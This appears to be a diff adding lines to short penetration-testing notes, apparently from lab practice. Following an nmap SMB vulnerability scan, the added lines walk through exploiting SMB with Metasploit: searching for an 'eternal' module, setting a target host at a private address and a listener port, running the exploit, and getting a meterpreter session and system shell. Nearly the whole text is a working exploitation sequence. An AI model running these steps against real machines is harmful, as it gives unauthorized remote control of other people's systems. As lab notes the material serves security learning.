@@ -21,3 +21,16 @@ nmap –script smb-vuln* -p 445
 - Exploit using msfconsole
 msfconsole
 
+msf6 > search eternal
+msf6 > use 0
+set RHOST 192.168.145.135
+set LPORT 4445
+exploit
+
+- Success:
+meterpreter >
+meterpreter > sysinfo
+meterpreter > shell
+
+
+
